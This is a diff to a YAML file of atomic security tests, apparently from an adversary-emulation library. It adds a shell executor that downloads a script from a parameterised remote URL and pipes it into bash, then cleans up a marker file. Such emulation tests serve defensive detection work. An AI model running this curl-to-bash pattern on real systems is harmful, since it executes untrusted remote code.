@@ -304,6 +304,17 @@ atomic_tests:
       if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
     get_prereq_command: |
       pkg update && pkg install -y curl
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      cd /tmp
+      curl -s #{remote_url}
+      ls -la /tmp/art.txt
+      curl -s #{remote_url} |bash
+      ls -la /tmp/art.txt      
+    cleanup_command: |
+      rm /tmp/art.txt      
 - name: Current kernel information enumeration
   auto_generated_guid: 3a53734a-9e26-4f4b-ad15-059e767f5f14
   description: |
